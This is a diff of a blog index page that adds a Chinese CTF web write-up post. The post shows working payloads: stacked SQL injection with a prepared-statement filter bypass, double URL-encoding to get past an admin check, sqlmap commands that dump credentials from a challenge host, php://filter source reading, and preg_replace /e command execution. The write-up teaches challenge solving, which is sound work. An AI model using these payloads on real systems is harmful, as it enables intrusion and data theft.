@@ -64,6 +64,97 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-ctf-web3" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/08/05/ctf-web3/" class="article-date">
+  <time datetime="2020-08-05T08:39:46.000Z" itemprop="datePublished">2020-08-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/05/ctf-web3/">ctf-web3</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="强网杯2019-supersqli"><a href="#强网杯2019-supersqli" class="headerlink" title="强网杯2019 supersqli"></a>强网杯2019 supersqli</h4><h6 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1. sql注入"></a>1. sql注入</h6><p>这道题可以使用堆叠注入，</p>
+<p>show databases；//查看可用数据库</p>
+<p>show tables；//查看数据库所有表项</p>
+<p>show columns from 表名；//查看表内所有列</p>
+<p>构造payload，?/inject=select 会发现有很多关键字被过滤，我们可以试图绕过</p>
+<p><img src="/2020/08/05/ctf-web3/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web3%5Cweb1.png" alt="web1"></p>
+<p>先show databases；在show tables；</p>
+<p><img src="/2020/08/05/ctf-web3/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web3%5Cweb2.png" alt="web2"></p>
+<p>发现所有表，搜索发现flag在</p>
+<p><img src="/2020/08/05/ctf-web3/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web3%5Cweb3.png" alt="web3"></p>
+<p>接下来我们只需要成功select这个表-&gt;用concat连接，定义变量预处理后执行来绕过<img src="/2020/08/05/ctf-web3/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web3%5Cweb4.png" alt="web4"></p>
+<p>?inject=1’;set @sql=concat(‘s’,’elect * from <code>1919810931114514</code>‘);PREPARE pre FROM @sql;EXECUTE pre;</p>
+<p>php：in_array(a,b), mb_substr(a,b,c), mb_strpos(a,b)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content–type:text&#x2F;html;chartset&#x3D;utf-8&quot;); </span><br><span class="line">$people &#x3D; array(&quot;Bill&quot;, &quot;Steve&quot;, &quot;Mark&quot;, &quot;David&quot;);</span><br><span class="line">$str &#x3D; &#39;苦练算法&#39;;</span><br><span class="line">echo in_array(&quot;Mark&quot;, $people)); &#x2F;&#x2F;true</span><br><span class="line">echo mb_strpos($str,&#39;算法&#39;); &#x2F;&#x2F;2 若不存在返回false</span><br><span class="line">echo mb_substr(&quot;你真的爱我吗&quot;, 2, 1); &#x2F;&#x2F; 输出：爱</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>js审计与正则表达式</p>
+<p>/^aaaas&amp;/ 匹配输入的开始(^限定开头,&amp;匹配结束)</p>
+<p>eval(xxx); 将执行xxx脚本，此时看到的代码会出现乱码因为是运算过的，将其换位alert/console.log(),可以看到原本的代码</p>
+<h4 id="xctf-PHP2"><a href="#xctf-PHP2" class="headerlink" title="xctf -PHP2"></a>xctf -PHP2</h4><p>phps文件是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容</p>
+<p>本题index.phps发现源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&quot;admin&quot;&#x3D;&#x3D;&#x3D;$_GET[id]) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;admin&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;Key: xxxxxxx &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>
+
+<p>payload中的id应该是admin的某个形式但是不是admin这五个字符，输入的id首先会被浏览器url解码一次，然后代码判断是否等于admin，再进行一次urldecode，此时应该得到admin，所以就是id的值admin的urlencode的俩次的结果。</p>
+<p>理解url编码就是某字符的16进制数钱加一个%，所以admin-&gt;%61%64%6d%69%6e-&gt;%2561%2564%256d%2569%256e</p>
+<p><img src="/2020/08/05/ctf-web3/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web3%5Cweb5.png" alt="web5"></p>
+<h4 id="xctf-ics-04"><a href="#xctf-ics-04" class="headerlink" title="xctf ics-04"></a>xctf ics-04</h4><p>sqlmap的简单使用</p>
+<p>-u 指定url， -d 连接数据库， –dbs 列出所有数据库， –tables 列出当前表，</p>
+<p>–columns 列出当前列， -D 选择哪个数据库， -T 选择哪个表， -C 选择哪个列</p>
+<p>-data data指定的数据会当做post数据提交</p>
+<p>该题目有 ”登录login.php”、“注册regist.php”、“忘记密码findpwd.php”，三个界面</p>
+<p>检测是否存在sql注入，发现登录和注册都没有，在忘记密码界面发现sql注入，使用语句’ or 1=1#发现可以进入，对<a href="http://220.249.52.133:45832/findpwd.php使用sqlmap检查。" target="_blank" rel="noopener">http://220.249.52.133:45832/findpwd.php使用sqlmap检查。</a></p>
+<p>python2 sqlmap.py -u “<a href="http://220.249.52.133:45832/findpwd.php&quot;" target="_blank" rel="noopener">http://220.249.52.133:45832/findpwd.php&quot;</a> –data=”username=1” –dbs</p>
+<p>python2 sqlmap.py -u “<a href="http://220.249.52.133:45832/findpwd.php&quot;" target="_blank" rel="noopener">http://220.249.52.133:45832/findpwd.php&quot;</a> –data=”username=1” -D cetc004 –tables</p>
+<p><img src="/2020/08/05/ctf-web3/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web3%5Cweb8.png" alt="web8"></p>
+<p>python2 sqlmap.py -u “<a href="http://220.249.52.133:45832/findpwd.php&quot;" target="_blank" rel="noopener">http://220.249.52.133:45832/findpwd.php&quot;</a> –data=”username=1” -D cetc004 -T user –columns</p>
+<p><img src="/2020/08/05/ctf-web3/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web3%5Cweb7.png" alt="web7"></p>
+<p>python2 sqlmap.py -u “<a href="http://220.249.52.133:45832/findpwd.php&quot;" target="_blank" rel="noopener">http://220.249.52.133:45832/findpwd.php&quot;</a> –data=”username=1” -D cetc004 -T user -C “username,password” –dump</p>
+<p><img src="/2020/08/05/ctf-web3/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web3%5Cweb6.png" alt="web6"></p>
+<p>找到用户名之后，我们发现这个系统的一个bug是同一个用户名可以有多个密码，于是我用c3tlwDmIn23用户名随意注册一个密码，在登录得到flag。</p>
+<p><img src="/2020/08/05/ctf-web3/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web3%5Cweb9.png" alt="web9"></p>
+<h4 id="xctf-ics-05"><a href="#xctf-ics-05" class="headerlink" title="xctf ics-05"></a>xctf ics-05</h4><h6 id="1-PHP伪协议的应用"><a href="#1-PHP伪协议的应用" class="headerlink" title="1. PHP伪协议的应用"></a>1. PHP伪协议的应用</h6><h6 id="2-php-preg-replace"><a href="#2-php-preg-replace" class="headerlink" title="2. php preg_replace()"></a>2. php preg_replace()</h6><p>PHP伪协议：file://协议与php://协议。file://协议常用来读取本地文件，php://协议常用php://input执行php代码，php://filter读取源码 （隐藏了超链接变量传参，看到变量传参，有可能存在文件包含漏洞读取源码</p>
+<p>php://filter/read=convert.base64-encode/resource=index.php读取文件源码(php)</p>
+<p><img src="/2020/08/05/ctf-web3/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web3%5Cweb13.png" alt="web13"></p>
+<p>cyberpeace{7924f28aef6f570176c585548f142aef}</p>
+<p>preg_replace($pattern, $replacement, $string);</p>
+<p>pattern中e模式可以把replacement的内容当成一个php表达式(只是一个无分号)，若想执行这条语句还要在string里面匹配到pattern，构造payload-&gt;</p>
+<p>/?pat=/\d/e&amp;rep=system(“ls”)&amp;sub=123  //匹配几次执行几次，123匹配三次所以会输出三次 列出目录如图</p>
+<p><img src="/2020/08/05/ctf-web3/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web3%5Cweb10.png" alt="web10"></p>
+<p>然后到可疑文件目录s3chahahaDir ，这里用+连接ls与s3chahahaDir，因为在get方法中参数若有‘+’，到后台会自动变成空格。构造payload-&gt;</p>
+<p>/?pat=/\d/e&amp;rep=system(“ls+s3chahahaDir”)&amp;sub=123 发现flag</p>
+<p><img src="/2020/08/05/ctf-web3/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web3%5Cweb11.png" alt="web11"></p>
+<p>cat到flag中发现无输出，flag还是个文件夹，同样的操作发现里面有flag.php文件，cat flag.php得到flag</p>
+<p><img src="/2020/08/05/ctf-web3/E:%5C%E5%8D%9A%E5%AE%A2%5Csource_posts%5Cctf-web3%5Cweb12.png" alt="web12"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://zmh2000829.github.io/2020/08/05/ctf-web3/" data-id="ckdh6scjm000054vbhy7vb1u8" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-ctf-web2" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/08/01/ctf-web2/" class="article-date">
@@ -113,7 +204,7 @@
 <p> &lt;?xml version=”1.0”?  &gt;</p>
 <p>&lt;! DOCTYPE test[</p>
 <p>&lt;! ENTITY t “here is a xxe”  &gt;] &gt;</p>
-<p>&lt; h&gt;&t;&lt; /h&gt; </p>
+<p>​    &lt; h&gt;&t;&lt; /h&gt; </p>
 <p>对于这个包先将content-type添加xml形式运行</p>
 <p><img src="/2020/08/01/ctf-web2/web9.png" alt="web9"></p>
 <p>发现存在xxe漏洞，修改报文，得到flag</p>
@@ -269,6 +360,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2020/08/05/ctf-web3/">ctf-web3</a>
+          </li>
         
           <li>
             <a href="/2020/08/01/ctf-web2/">ctf-web2(原创)</a>
